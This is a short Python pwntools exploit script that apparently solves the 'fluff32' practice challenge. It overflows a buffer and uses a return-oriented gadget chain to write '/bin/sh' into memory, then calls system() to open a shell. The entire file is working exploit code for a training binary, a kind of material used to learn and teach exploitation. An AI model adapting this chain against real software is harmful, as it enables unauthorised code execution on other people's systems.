#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./fluff32')
else:
	p = remote()

useful_func = 0x0804864C
call_sys = 0x08048430

buf = 0x804a070
command = '/bin/sh\x00'

# 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
mov_pecx_edx_ = 0x08048693
# 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
xchg_edx_ecx_ = 0x08048689
# 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_ebx_ = 0x0804867b
# 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
xor_edx_edx_ = 0x08048671

pop_ebx_ret = 0x080483e1

gdb.attach(p)

payload = cyclic(0x200)
payload = 'A' * 44

for i in range(len(command) / 4):
	payload += p32(pop_ebx_ret) + \
               p32(buf + 4 * i) + \
               p32(xor_edx_edx_) + \
               p32(0xdeadbeef) + \
               p32(xor_edx_ebx_) + \
               p32(0xdeadbeef) + \
               p32(xchg_edx_ecx_) + \
               p32(0xdeadbeef)
	payload += p32(pop_ebx_ret) + \
               command[4 * i:4 * i + 4] + \
               p32(xor_edx_edx_) + \
               p32(0xdeadbeef) + \
               p32(xor_edx_ebx_) + \
               p32(0xdeadbeef) + \
               p32(mov_pecx_edx_) + \
               p32(0xdeadbeef) + p32(0)

payload += p32(call_sys) + p32(0xdeadbeef) + p32(buf)

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
